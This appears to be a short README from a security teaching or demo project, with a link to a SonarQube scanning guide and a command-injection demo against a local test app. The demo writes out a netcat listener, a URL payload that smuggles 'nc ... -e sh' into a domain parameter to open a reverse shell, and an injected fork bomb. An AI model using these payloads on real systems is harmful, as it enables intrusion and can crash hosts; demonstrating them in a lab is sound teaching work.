# Code Security 

## Code scanning

- [Sonarqube](sonarqube/README.md)

## Remote Code execution with Reverse Shell

```bash
# Locally
nc -lvp 8888
#/usr/local/bin/docker exec -it <container-id> nc -lvp 8888

# In any browser
http://goto-demo.localtest.me:8000/?domain=www.google.com; nc localhost 8888 -e sh%0a
fork() {%0a
    fork | fork %26%0a
}%0a
fork%0a
```
